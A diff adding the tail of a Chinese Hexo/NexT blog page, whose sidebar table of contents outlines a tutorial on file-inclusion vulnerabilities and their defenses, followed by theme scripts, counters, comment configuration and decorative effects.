+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">文件包含原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">文件包含分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.1.</span> <span class="nav-text">1.本地文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.2.</span> <span class="nav-text">2.远程文件包含</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E4%BB%A5%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">常见的存在文件包含的脚本语言以及函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-php"><span class="nav-number">3.1.</span> <span class="nav-text">1.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-jsp-servlet"><span class="nav-number">3.2.</span> <span class="nav-text">2.jsp&#x2F;servlet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-asp"><span class="nav-number">3.3.</span> <span class="nav-text">3.asp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.</span> <span class="nav-text">各个协议如何实现命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-00%E6%88%AA%E6%96%AD"><span class="nav-number">4.1.</span> <span class="nav-text">1.%00截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-file%EF%BC%9A-%E7%94%A8%E4%BA%8E%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">4.2.</span> <span class="nav-text">2.file：&#x2F;&#x2F;:用于访问本地文件系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-php-%E8%AE%BF%E9%97%AE%E5%90%84%E4%B8%AA%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81"><span class="nav-number">4.3.</span> <span class="nav-text">3.php:&#x2F;&#x2F;:访问各个输入输出流</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%B9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">对文件包含的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">5.1.</span> <span class="nav-text">1.包含上传文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.2.</span> <span class="nav-text">2.伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">5.3.</span> <span class="nav-text">3.包含日志文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%8C%85%E5%90%AB-proc-self-environ"><span class="nav-number">5.4.</span> <span class="nav-text">4.包含&#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6"><span class="nav-number">5.5.</span> <span class="nav-text">5.包含Session文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">6.</span> <span class="nav-text">常见的绕过与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-00%E6%88%AA%E6%96%AD-1"><span class="nav-number">6.1.</span> <span class="nav-text">1.%00截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD"><span class="nav-number">6.2.</span> <span class="nav-text">2.超长字符截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">6.3.</span> <span class="nav-text">3.任意目录遍历</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%97%AE%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="nav-number">6.4.</span> <span class="nav-text">4.问号截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93"><span class="nav-number">6.5.</span> <span class="nav-text">5.防御总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="吴淑影"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">吴淑影</p>
+  <div class="site-description" itemprop="description">Believe not all that you see nor half what you hear.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+
+
+
+      
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-ctf/" rel="tag">-web -ctf</a><span class="tag-list-count">13</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp-VNCTF/" rel="tag">-wp -VNCTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%88%B7%E9%A2%98/" rel="tag">web刷题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/" rel="tag">web常见漏洞及其修复</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp%E3%80%81/" rel="tag">wp、</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag">知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%95%BF%E5%AE%89%E6%88%98%E5%BD%B9/" rel="tag">长安战役</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003013号 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000196%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000196号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; Sun Dec 26 2021 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">吴淑影</span>
+</div>
+  <div class="powered-by">
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("12/25/2021 17:38:00");
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "影影已在此快乐的玩耍了 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+<br />
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">影影的家共种了35k朵花</span>
+</div>
+
+<br />
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    已经有<span id="busuanzi_value_site_pv"></span>人摘了影影种的花</span>
+    <span class="post-meta-divider"> </span>
+    其中<span id="busuanzi_value_site_uv"></span>人不留痕迹地跑了</span>
+    <span class="post-meta-divider"> </span>
+
+
+
+
+
+<a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referra"><img src="https://z4a.net/images/2022/05/31/image649ac1128183cf97.png"align="absmiddle" width="59px" height="30px" /></a>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'vcFyBSklL05djh0SlQ0i9Idk-gzGzoHsz',
+      appKey     : 'wFXz2jiwl2Jo3Q5LWDFdhUsv',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
+
+
+<script src="/js/cursor.js"></script>
+
+<script type="text/javascript">
+//只在桌面版网页启用特效
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
